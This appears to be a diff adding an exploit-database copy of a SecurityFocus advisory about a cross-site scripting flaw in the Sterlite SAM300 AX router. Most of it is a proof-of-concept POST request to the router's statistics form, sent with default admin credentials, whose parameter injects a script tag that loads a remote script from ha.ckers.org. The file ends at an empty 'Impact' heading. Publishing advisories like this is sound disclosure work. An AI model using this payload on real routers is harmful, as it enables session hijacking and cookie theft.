@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/39928/info
+
+The Sterlite SAM300 AX Router is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks. 
+
+*+POST Request+*
+
+POST http://192.168.1.1/Forms/status_statistics_1 HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.7)
+Gecko/20091221 Firefox/3.5.7 Paros/3.2.13
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+Referer: http://192.168.1.1/status/status_statistics.htm
+Authorization: Basic YWRtaW46YWRtaW4=
+Content-Type: application/x-www-form-urlencoded
+Content-length: 101
+
+*+POST Parameters+*
+
+Stat_Radio=%3CSCRIPT%20SRC%3Dhttp%3A%2F%2Fha.ckers.org
+%2Fxss.js%3E%3C%2FSCRIPT%3E&StatRefresh=REFRESH
+
+*+Impact+* 
